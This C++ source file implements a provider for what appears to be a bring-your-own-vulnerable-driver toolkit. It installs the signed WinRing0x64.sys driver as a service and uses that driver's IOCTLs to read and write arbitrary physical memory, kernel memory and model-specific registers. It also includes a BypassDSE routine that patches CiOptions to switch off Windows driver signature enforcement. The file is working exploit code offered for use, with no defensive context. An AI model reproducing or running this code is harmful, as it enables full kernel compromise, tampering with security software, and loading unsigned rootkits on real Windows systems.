#include "WinRing0Provider.h"
#include "../Resources/DriverDataManager.h"
#include "../Utils.h"
#include "../ProviderSystem.h"
#include <iostream>
#include <vector>
#include <filesystem>

// WinRing0 / OLS IOCTL Definitions
#define OLS_TYPE            (DWORD)40000

#define OLS_READ_MEMORY     (DWORD)0x841
#define OLS_WRITE_MEMORY    (DWORD)0x842

#define IOCTL_OLS_READ_MEMORY \
	CTL_CODE(OLS_TYPE, OLS_READ_MEMORY, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_MEMORY \
	CTL_CODE(OLS_TYPE, OLS_WRITE_MEMORY, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define OLS_READ_MSR        (DWORD)0x821
#define OLS_WRITE_MSR       (DWORD)0x822

#define IOCTL_OLS_READ_MSR \
	CTL_CODE(OLS_TYPE, OLS_READ_MSR, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_WRITE_MSR \
	CTL_CODE(OLS_TYPE, OLS_WRITE_MSR, METHOD_BUFFERED, FILE_ANY_ACCESS)

#pragma pack(push,4)
typedef struct _OLS_READ_MEMORY_INPUT {
    LARGE_INTEGER Address; // PHYSICAL_ADDRESS
    ULONG UnitSize;
    ULONG Count;
} OLS_READ_MEMORY_INPUT;

typedef struct _OLS_WRITE_MEMORY_INPUT {
    LARGE_INTEGER Address; // PHYSICAL_ADDRESS
    ULONG UnitSize;
    ULONG Count;
    UCHAR Data[1];
} OLS_WRITE_MEMORY_INPUT;
#pragma pack(pop)

namespace KernelMode {
    namespace Providers {

        ProviderLoadData WinRing0Provider::loadData = {
            true,   // PhysMemoryBruteForce
            true,   // PML4FromLowStub (Yes, needed for Virt2Phys via Phys)
            true,   // PreferPhysical
            false,  // RequiresDSE (It's signed usually)
            (ULONG)(PROVIDER_CAP_PHYSICAL_MEMORY | PROVIDER_CAP_PREFER_PHYSICAL),
            L"WinRing0 (OpenLibSys) - Physical Memory Access"
        };

        WinRing0Provider::WinRing0Provider()
            : deviceHandle(INVALID_HANDLE_VALUE), serviceHandle(nullptr) {
        }

        WinRing0Provider::~WinRing0Provider() {
            Deinitialize();
        }

        bool WinRing0Provider::Initialize(ULONG driverId, bool bypassDSE) {
            std::wcout << L"[+] Initializing WinRing0Provider..." << std::endl;

            // TODO: Add proper ID to DriverDataManager if needed.
            // Using a placeholder ID or just assuming manual extraction for now.
            // In a real scenario, we'd add DRIVER_ID_WINRING0 to DriverDataManager.
            if (driverId == 0) {
                 // We don't have a constant yet, let's use a high number or rely on file existence
                 // For now, let's pretend ID 0 is okay and we'll fallback to local file
            }

            auto& driverManager = Resources::DriverDataManager::GetInstance();
            std::wstring tempPath = L"C:\\Windows\\Temp\\WinRing0x64.sys";
            std::wstring localPath = L"drv\\WinRing0x64.sys";

            // Attempt extraction (will fail if ID not known) or copy local
            if (std::filesystem::exists(localPath)) {
                 std::filesystem::copy_file(localPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                 this->dirDriverPath = tempPath;
            } else {
                 // Try extraction if we had the ID mapped. 
                 // For now, let's assume the user put the driver in drv/
                 std::wcerr << L"[-] WinRing0x64.sys not found in drv/ folder." << std::endl;
                 return false;
            }

            if (!InstallDriverService()) {
                 std::wcerr << L"[-] Failed to install WinRing0 service (might be running)." << std::endl;
            }

            if (!OpenDeviceHandle()) {
                std::wcerr << L"[-] Failed to open WinRing0 device handle." << std::endl;
                return false;
            }

            std::wcout << L"[+] WinRing0Provider initialized successfully." << std::endl;
            return true;
        }

        void WinRing0Provider::Deinitialize() {
            if (deviceHandle != INVALID_HANDLE_VALUE) {
                CloseHandle(deviceHandle);
                deviceHandle = INVALID_HANDLE_VALUE;
            }
            if (serviceHandle) {
                Utils::RemoveDriverService(serviceHandle);
                serviceHandle = nullptr;
            }
            if (!dirDriverPath.empty()) {
                DeleteFileW(dirDriverPath.c_str());
            }
        }

        std::wstring WinRing0Provider::GetProviderName() const {
            return L"WinRing0";
        }

        bool WinRing0Provider::InstallDriverService() {
            // Service Name "WinRing0_1_2_0" is common
            return (this->serviceHandle = Utils::CreateDriverService(L"WinRing0_1_2_0", this->dirDriverPath)) != nullptr;
        }

        bool WinRing0Provider::OpenDeviceHandle() {
            // Device Name usually \Device\WinRing0_1_2_0
            // Usermode link: \\.\WinRing0_1_2_0
            deviceHandle = CreateFileW(
                L"\\\\.\\WinRing0_1_2_0",
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
            
            return deviceHandle != INVALID_HANDLE_VALUE;
        }

        bool WinRing0Provider::ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            if (deviceHandle == INVALID_HANDLE_VALUE) return false;

            OLS_READ_MEMORY_INPUT request;
            request.Address.QuadPart = physicalAddress;
            request.UnitSize = 1; // Byte granularity
            request.Count = (ULONG)size;

            DWORD bytesReturned = 0;
            return DeviceIoControl(
                deviceHandle,
                IOCTL_OLS_READ_MEMORY,
                &request,
                sizeof(request),
                buffer,
                (DWORD)size,
                &bytesReturned,
                NULL
            );
        }

        bool WinRing0Provider::WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            if (deviceHandle == INVALID_HANDLE_VALUE) return false;

            // Structure has flexible array member, need to allocate enough space
            size_t totalSize = FIELD_OFFSET(OLS_WRITE_MEMORY_INPUT, Data) + size;
            std::vector<BYTE> requestBuffer(totalSize);
            
            OLS_WRITE_MEMORY_INPUT* request = (OLS_WRITE_MEMORY_INPUT*)requestBuffer.data();
            request->Address.QuadPart = physicalAddress;
            request->UnitSize = 1;
            request->Count = (ULONG)size;
            memcpy(request->Data, buffer, size);

            DWORD bytesReturned = 0;
            return DeviceIoControl(
                deviceHandle,
                IOCTL_OLS_WRITE_MEMORY,
                request,
                (DWORD)totalSize,
                NULL,
                0,
                &bytesReturned,
                NULL
            );
        }

        bool WinRing0Provider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
            uintptr_t phys = VirtualToPhysical(address);
            if (phys) return ReadPhysicalMemory(phys, buffer, size);
            return false;
        }

        bool WinRing0Provider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
             uintptr_t phys = VirtualToPhysical(address);
             if (phys) return WritePhysicalMemory(phys, buffer, size);
             return false;
        }

        uintptr_t WinRing0Provider::VirtualToPhysical(uintptr_t virtualAddress) {
             return Utils::VirtualToPhysical(this, virtualAddress);
        }

        bool WinRing0Provider::ReadMsr(ULONG msrIndex, ULONG64* value) {
            if (deviceHandle == INVALID_HANDLE_VALUE || !value) return false;
            
            ULONG registerIndex = msrIndex;
            ULARGE_INTEGER result = { 0 };
            DWORD bytesReturned = 0;

            if (DeviceIoControl(
                deviceHandle,
                IOCTL_OLS_READ_MSR,
                &registerIndex,
                sizeof(registerIndex),
                &result,
                sizeof(result),
                &bytesReturned,
                NULL
            )) {
                *value = result.QuadPart;
                return true;
            }
            return false;
        }

        bool WinRing0Provider::WriteMsr(ULONG msrIndex, ULONG64 value) {
            if (deviceHandle == INVALID_HANDLE_VALUE) return false;

            #pragma pack(push, 4)
            struct {
                ULONG Register;
                ULARGE_INTEGER Value;
            } request;
            #pragma pack(pop)
            
            request.Register = msrIndex;
            request.Value.QuadPart = value;

            DWORD bytesReturned = 0;
            return DeviceIoControl(
                deviceHandle,
                IOCTL_OLS_WRITE_MSR,
                &request,
                sizeof(request),
                NULL,
                0,
                &bytesReturned,
                NULL
            );
        }

        bool WinRing0Provider::BypassDSE() {
             return Utils::PatchCiOptions(this);
        }

        ULONG WinRing0Provider::GetCapabilities() const {
             return loadData.Capabilities;
        }

        const ProviderLoadData* WinRing0Provider::GetLoadData() const {
            return &loadData;
        }

    }
}
